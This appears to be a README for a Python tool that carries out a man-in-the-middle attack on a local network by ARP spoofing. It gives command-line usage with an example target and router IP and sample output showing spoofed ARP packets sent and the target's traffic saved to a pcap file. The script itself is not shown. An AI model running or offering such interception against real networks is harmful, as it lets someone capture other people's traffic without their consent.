# MITM-using-ArpSpoofing
Man in the middle attack using Arp Spoofing.


### Getting Started
```
Gil@kali:/root/Desktop$ python MITM.py <interface> <TargetIP> <RouterIP> <pcap file path>
```
for Example:
```
Gil@kali:/root/Desktop$ python MITM.py eth0 192.168.1.52 192.168.1.100 /root/Desktop/Gil
```
output:
```
The pcap file was created in the path : /root/Desktop/Gil

Arp Spoofing is Running... 156 packets of ARP have been sent So far.
---------------------------------------------------------------------------

Sniffer is Running... 768 packets From the Target have been collected so far.
-----------------------------------------------------------------------------
```
## Requirements

* Linux OS
* Python 3.7 

## Authors
Gil Matitiyahu
